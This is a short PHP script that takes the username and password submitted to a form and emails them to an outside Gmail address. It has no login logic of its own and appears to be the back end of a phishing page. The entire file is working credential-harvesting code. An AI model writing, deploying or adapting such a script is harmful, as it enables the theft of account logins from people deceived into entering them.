<?php

$username = $_POST['username'];
$password = $_POST['password'];


$to = 'lolginator555@gmail.com';


mail($to, $username, $password, "From: lolginator777@gmail.com")

?>